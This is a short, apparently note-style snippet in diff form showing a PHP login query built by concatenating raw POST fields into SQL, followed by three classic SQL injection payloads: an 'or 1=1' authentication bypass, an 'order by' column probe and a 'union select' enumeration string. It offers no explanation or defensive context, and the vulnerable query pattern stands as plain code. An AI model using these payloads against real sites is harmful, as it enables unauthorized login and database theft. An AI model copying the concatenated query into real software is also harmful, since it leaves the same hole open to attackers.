@@ -1,0 +1,9 @@
+$query = "SELECT * from users WHERE user='".$_POST['user']."' AND pass='".    $_POST['pass']    ."'";
+$query = "SELECT * from users WHERE user='".$_POST['user']."' AND pass=' ".    ' or 1=1  or pass = '         ." ' ";
+
+1.
+mohi' or 1=1 limit 1 #
+2.
+1 order by 5
+3.
+1 union select 1,2,3,4,5
